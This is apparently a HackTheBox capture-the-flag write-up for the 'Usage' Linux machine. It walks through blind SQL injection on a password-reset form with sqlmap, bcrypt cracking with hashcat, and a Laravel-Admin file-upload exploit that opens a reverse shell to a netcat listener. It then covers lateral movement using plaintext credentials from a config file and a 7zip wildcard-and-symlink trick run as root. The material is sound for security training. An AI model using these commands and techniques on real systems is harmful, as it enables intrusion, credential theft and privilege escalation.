# Usage - HackTheBox Writeup

**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.10.x.x

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [SQL Injection — Password Reset Form](#2-sql-injection--password-reset-form)
3. [Hash Cracking](#3-hash-cracking)
4. [Laravel-Admin File Upload RCE](#4-laravel-admin-file-upload-rce)
5. [Lateral Movement — dash to xander](#5-lateral-movement--dash-to-xander)
6. [Privilege Escalation — xander to root](#6-privilege-escalation--xander-to-root)

---

## 1. Reconnaissance

### TCP Scan
```bash
nmap -sC -sV -oA nmap/usage 
```

**Results:**
- Port 22 — OpenSSH
- Port 80 — nginx 1.18.0

Two virtual hosts identified. Added both to `/etc/hosts`:
```bash
echo " usage.htb admin.usage.htb" >> /etc/hosts
```

### Web Enumeration

Browsing to `usage.htb` revealed:
- User registration and login
- Password reset at `/forget-password`

Browsing to `admin.usage.htb` revealed a Laravel-Admin login panel.

> **Key Takeaway:** Always check for virtual hosts. Two completely different applications were running on the same IP — one was the attack surface, the other was the target.

---

## 2. SQL Injection — Password Reset Form

### Identifying the Vulnerability

While testing the password reset form at `http://usage.htb/forget-password` I noticed two different responses based on the email submitted:

- Registered email → "We have sent a reset link to your email"
- Unknown email → "Email not found"

Different responses mean the app is querying the database and returning results based on what it finds — the necessary condition for blind SQL injection.

**Mental model of the backend query:**
```sql
SELECT * FROM users WHERE email = '[YOUR INPUT]'
```

### Manual Verification

Submitted `' OR 1=1-- -` as the email value:
```
email=test@test.com' OR 1=1-- -
```

This transforms the query to:
```sql
SELECT * FROM users WHERE email = '' OR 1=1-- -'
```

`OR 1=1` always evaluates to true so the query always returns rows. The app responded with "reset link sent" — confirming SQL injection.

### Capturing the Request

Intercepted the forget-password POST request in Burp Suite and saved it as `forgot.req`:
```
POST /forget-password HTTP/1.1
Host: usage.htb
Content-Type: application/x-www-form-urlencoded

_token=LtjF2QRgKfPYmX5EQtKCzEXP9XbH18QAlOHKWa16&email=test@test.com
```

> **Important:** The form uses Laravel's CSRF protection (`_token`). SQLmap needs to fetch a fresh token before each request otherwise every request gets rejected.

### Automated Extraction with SQLmap
```bash
# Step 1 — Find databases
sqlmap -r forgot.req -p email \
  --batch --dbms=mysql \
  --threads=10 --level=3 \
  --csrf-token="_token" \
  --csrf-url="http://usage.htb/forget-password" \
  --dbs

# Step 2 — Find tables
sqlmap -r forgot.req -p email \
  --batch --dbms=mysql \
  --threads=10 \
  --csrf-token="_token" \
  --csrf-url="http://usage.htb/forget-password" \
  -D usage_blog --tables

# Step 3 — Dump admin credentials
sqlmap -r forgot.req -p email \
  --batch --dbms=mysql \
  --threads=10 \
  --csrf-token="_token" \
  --csrf-url="http://usage.htb/forget-password" \
  -D usage_blog -T admin_users --dump
```

**SQLmap identified boolean-based blind injection using a subquery technique:**
```sql
email=test' AND 5449=(SELECT (CASE WHEN (5449=5449) THEN 5449 
ELSE (SELECT 8645 UNION SELECT 2879) END))-- RIzV
```

The CASE statement returns different values for true/false conditions. The app translates this into different responses ("sent" vs "not found") that sqlmap detects to extract data one bit at a time.

**Why --threads=10 matters:** Boolean blind extracts data character by character using binary search — roughly 7 requests per character. A 60-character bcrypt hash needs ~420 requests. Threading makes this 10x faster.

**Result:** Bcrypt hash extracted from `admin_users` table.
```
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
```

---

## 3. Hash Cracking

Identified hash type by the `$2y$10$` prefix — this is bcrypt. Hashcat mode 3200.
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:**
```
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
```

> **Hash identification tip:** The prefix tells you the type. `$2y$` / `$2a$` / `$2b$` = bcrypt. `$6$` = SHA512crypt. `$1$` = MD5crypt. No prefix + 32 chars = MD5.

---

## 4. Laravel-Admin File Upload RCE

### Version Discovery

Logged into `admin.usage.htb` with `admin:whatever1`. The dashboard immediately revealed version information:
```
encore/laravel-admin 1.8.18
Laravel 10.18.0
PHP 8.1.2
nginx 1.18.0
```

> **Key habit:** Always read the dashboard after logging into any admin panel. Version numbers are attack surface. Search every version against known CVEs before doing anything else.

### CVE — Arbitrary File Upload

Searching for `laravel-admin 1.8.18 exploit` revealed an arbitrary file upload vulnerability. The profile picture upload functionality failed to properly validate file types server-side, allowing upload of a PHP webshell.

Used a public exploit script:
```bash
python3 exploit.py \
  -u http://admin.usage.htb \
  -U admin \
  -P whatever1 \
  -i  \
  -p 4444
```

Started a listener before running the exploit:
```bash
nc -lvnp 4444
```

**Result:** Reverse shell received as user `dash`.

### Shell Stabilization
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Grabbed user flag:**
```bash
cat /home/dash/user.txt
```

---

## 5. Lateral Movement — dash to xander

### Enumerating Home Directory

First thing after landing on a new shell — check dotfiles:
```bash
ls -la /home/dash
```

**Found:** `.montrc` — a hidden config file for the Monit process monitoring tool.
```bash
cat /home/dash/.montrc
```

Monit requires credentials to authenticate to the services it monitors, so it stores them in plaintext in its config file. The file contained credentials for user `xander`.

### Switching User
```bash
su - xander
# enter password found in .montrc
```

It worked — password reuse between the tool config and the system account.

> **Key habit:** Always run `ls -la` in every home directory. Tool config files (`.montrc`, `.netrc`, `.env`, `.bashrc`) regularly contain plaintext credentials. The cost is one command. The reward is lateral movement.

---

## 6. Privilege Escalation — xander to root

### sudo -l

First command after every privilege change:
```bash
sudo -l
```

**Output:**
```
(ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

A custom binary executable as root without a password. Custom binaries in sudo are almost always the intended privesc path — someone wrote code that runs as root and it likely does something dangerous.

### Binary Analysis

Cannot read compiled code directly. Used `strings` to extract readable text:
```bash
strings /usr/bin/usage_management
```

**Key findings:**
```
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option
```

Two things immediately stand out:

1. Option 1 runs 7zip with a `*` wildcard in `/var/www/html`
2. We need to check if we can write to `/var/www/html`
```bash
ls -la /var/www/html
# xander has write access
```

Write access to the wildcard directory — wildcard injection is possible.

### Understanding the Attack

**Step 1 — Wildcard expansion**

When Linux runs:
```bash
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

The shell expands `*` before 7zip runs. Every filename in `/var/www/html` becomes a command line argument. Since we control the directory, we control what arguments 7zip receives.

**Step 2 — 7zip list file feature**

7zip has a built-in feature: any argument starting with `@` is treated as a list file. 7zip strips the `@` and opens the remaining filename to read a list of files to archive.

So if `@root.txt` appears as an argument:
```
7zip sees @root.txt
        ↓
strips @ → opens root.txt
        ↓
reads contents as list of filenames to archive
```

**Step 3 — Symlink**

Create `root.txt` as a symlink pointing to `/root/root.txt`. When 7zip (running as root) opens `root.txt` the OS silently redirects it to `/root/root.txt`. 7zip reads the root flag and tries to treat it as a filename — printing it on screen as an error.

### Exploit
```bash
# Work in /tmp first
cd /tmp

# Create the @ trigger file — contents dont matter, only the name matters
touch -- @root.txt

# Create symlink pointing to the root flag
ln -s /root/root.txt root.txt

# Move both files to the wildcard directory
mv @root.txt root.txt /var/www/html

# Verify both files are in place
ls -la /var/www/html | grep root
```
```bash
# Run the binary as root and choose option 1 (Project Backup)
sudo /usr/bin/usage_management
```

**What happens internally:**
```
* expands in /var/www/html
        ↓
@root.txt becomes a command argument
        ↓
7zip sees @ → strips it → looks for root.txt in /var/www/html
        ↓
root.txt is a symlink → OS redirects to /root/root.txt
        ↓
7zip running as root reads /root/root.txt
        ↓
tries to find a file named after the flag value
        ↓
flag prints on screen as "No such file or directory" error
```

**Output:**
```
WARNING: No more files
ae9772704df1dd0756c0168050f22eb7
```

That warning IS the root flag.

> **Why touch -- @root.txt needs --:** In Linux `--` signals end of options. Everything after it is treated as a filename not a flag. Without `--`, the shell might misinterpret `@root.txt` depending on the shell. Always use `--` when creating files with special characters in the name.

---

## Attack Chain Summary
```
usage.htb password reset form
        ↓
Different responses for valid/invalid email → blind SQLi confirmed
        ↓
' OR 1=1-- - manual verification
        ↓
sqlmap boolean blind → bcrypt hash extracted
        ↓
hashcat -m 3200 + rockyou → whatever1
        ↓
admin.usage.htb login → laravel-admin 1.8.18
        ↓
CVE file upload bypass → reverse shell as dash
        ↓
ls -la /home/dash → .montrc → xander credentials
        ↓
su - xander
        ↓
sudo -l → /usr/bin/usage_management NOPASSWD
        ↓
strings → 7zip wildcard in /var/www/html
        ↓
@root.txt + root.txt symlink → wildcard injection
        ↓
root flag printed in 7zip output
```
